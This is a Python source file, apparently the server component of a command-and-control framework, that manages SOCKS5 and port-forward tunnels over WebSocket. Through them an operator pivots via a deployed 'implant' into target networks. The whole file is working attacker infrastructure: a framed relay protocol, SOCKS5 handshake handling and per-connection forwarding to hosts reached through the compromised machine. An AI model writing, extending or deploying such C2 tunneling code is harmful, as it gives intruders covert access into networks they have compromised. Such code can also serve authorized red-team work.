"""
TunnelManager — manages SOCKS5 and port-forward sessions over WebSocket.

Flow:
  Panel queues socks5_start/portfwd_add → implant receives in beacon response
  → implant opens WS to /c2/tunnel/{type}/{session_id}
  → TunnelManager.register_ws() starts local TCP listener
  → operator connects to local listener → data relayed through WS → implant → target

WS binary frame: [1-byte cmd][4-byte conn_id BE][N-byte payload]
  0x01 CONNECT   panel→implant: "host:port\n"
  0x02 DATA      bidirectional: raw bytes
  0x03 CLOSE     bidirectional: empty
  0x04 CONNECTED implant→panel: empty (TCP connected)
  0x05 ERROR     implant→panel: error string
"""

import asyncio
import logging
import struct
from dataclasses import dataclass, field
from fastapi import WebSocket

logger = logging.getLogger(__name__)

CMD_CONNECT = 0x01
CMD_DATA = 0x02
CMD_CLOSE = 0x03
CMD_CONNECTED = 0x04
CMD_ERROR = 0x05
_PORT_BASE = 30000  # Auto-allocate SOCKS5/portfwd ports from here


def _enc(cmd, conn_id, payload=b""):
    return struct.pack(">BI", cmd, conn_id) + payload


def _dec(data):
    if len(data) < 5:
        raise ValueError(f"frame too short ({len(data)})")
    cmd, conn_id = struct.unpack(">BI", data[:5])
    return cmd, conn_id, data[5:]


@dataclass
class TunnelSession:
    session_id: str
    tunnel_type: str
    ws: WebSocket | None = None
    local_port: int = 0
    remote_host: str = ""
    remote_port: int = 0
    server: asyncio.AbstractServer | None = None
    connections: dict = field(default_factory=dict)
    _next_id: int = 1

    def alloc_conn_id(self):
        cid = self._next_id
        self._next_id += 1
        return cid


class TunnelManager:
    def __init__(self):
        self._sessions: dict[str, TunnelSession] = {}
        self._lock = asyncio.Lock()
        self._port_counter = _PORT_BASE

    def _alloc_port(self):
        p = self._port_counter
        self._port_counter += 1
        return p

    async def create_session(self, session_id, tunnel_type,
                              remote_host="", remote_port=0, local_port=0):
        async with self._lock:
            sess = TunnelSession(session_id=session_id, tunnel_type=tunnel_type,
                                  remote_host=remote_host, remote_port=remote_port,
                                  local_port=local_port)
            self._sessions[session_id] = sess
        return sess

    async def register_ws(self, session_id, ws):
        async with self._lock:
            sess = self._sessions.get(session_id)
        if not sess:
            logger.warning(f"Unknown session: {session_id}")
            return None
        sess.ws = ws
        if sess.tunnel_type == "socks5":
            await self._start_socks5(sess)
        elif sess.tunnel_type == "portfwd":
            await self._start_portfwd(sess)
        return sess

    async def _start_socks5(self, sess):
        port = self._alloc_port()
        sess.local_port = port
        sess.server = await asyncio.start_server(
            lambda r, w: self._socks5_client(r, w, sess), "127.0.0.1", port)
        logger.info(f"SOCKS5 on 127.0.0.1:{port} session={sess.session_id[:8]}")

    async def _start_portfwd(self, sess):
        port = sess.local_port or self._alloc_port()
        sess.local_port = port
        sess.server = await asyncio.start_server(
            lambda r, w: self._portfwd_client(r, w, sess), "127.0.0.1", port)
        logger.info(f"PortFwd 127.0.0.1:{port} → {sess.remote_host}:{sess.remote_port}")

    async def _socks5_client(self, reader, writer, sess):
        conn_id = sess.alloc_conn_id()
        try:
            hdr = await reader.readexactly(2)
            if hdr[0] != 0x05:
                return
            await reader.readexactly(hdr[1])
            writer.write(b"\x05\x00")
            await writer.drain()

            req = await reader.readexactly(4)
            if req[1] != 0x01:
                writer.write(b"\x05\x07\x00\x01" + b"\x00"*6)
                await writer.drain()
                return

            atyp = req[3]
            if atyp == 0x01:
                host = ".".join(str(b) for b in await reader.readexactly(4))
            elif atyp == 0x03:
                n = (await reader.readexactly(1))[0]
                host = (await reader.readexactly(n)).decode()
            else:
                writer.write(b"\x05\x08\x00\x01" + b"\x00"*6)
                await writer.drain()
                return

            port = struct.unpack(">H", await reader.readexactly(2))[0]
            await self._relay_client(reader, writer, sess, conn_id, f"{host}:{port}", socks5=True)
        except Exception as e:
            logger.debug(f"SOCKS5 conn {conn_id}: {e}")
        finally:
            sess.connections.pop(conn_id, None)
            writer.close()

    async def _portfwd_client(self, reader, writer, sess):
        conn_id = sess.alloc_conn_id()
        try:
            await self._relay_client(reader, writer, sess, conn_id,
                                      f"{sess.remote_host}:{sess.remote_port}", socks5=False)
        except Exception as e:
            logger.debug(f"PortFwd conn {conn_id}: {e}")
        finally:
            sess.connections.pop(conn_id, None)
            writer.close()

    async def _relay_client(self, reader, writer, sess, conn_id, target, socks5):
        ev = asyncio.Event()
        sess.connections[conn_id] = (reader, writer, ev)
        if sess.ws:
            await sess.ws.send_bytes(_enc(CMD_CONNECT, conn_id, f"{target}\n".encode()))
        await asyncio.wait_for(ev.wait(), timeout=10.0)
        if socks5:
            writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
        while True:
            data = await reader.read(4096)
            if not data:
                break
            if sess.ws:
                await sess.ws.send_bytes(_enc(CMD_DATA, conn_id, data))
        if sess.ws:
            try:
                await sess.ws.send_bytes(_enc(CMD_CLOSE, conn_id))
            except Exception:
                pass

    async def relay_from_implant(self, session_id, data):
        async with self._lock:
            sess = self._sessions.get(session_id)
        if not sess:
            return
        try:
            cmd, conn_id, payload = _dec(data)
        except ValueError as e:
            logger.warning(f"Bad WS frame: {e}")
            return

        entry = sess.connections.get(conn_id)
        if not entry:
            return
        _, writer, ev = entry

        if cmd == CMD_CONNECTED:
            ev.set()
        elif cmd == CMD_DATA:
            writer.write(payload)
            await writer.drain()
        elif cmd in (CMD_CLOSE, CMD_ERROR):
            ev.set()
            writer.close()
            sess.connections.pop(conn_id, None)

    async def close_session(self, session_id):
        async with self._lock:
            sess = self._sessions.pop(session_id, None)
        if sess and sess.server:
            sess.server.close()
            await sess.server.wait_closed()
        logger.info(f"Tunnel {session_id[:8]} closed")

    def get_session(self, session_id):
        return self._sessions.get(session_id)
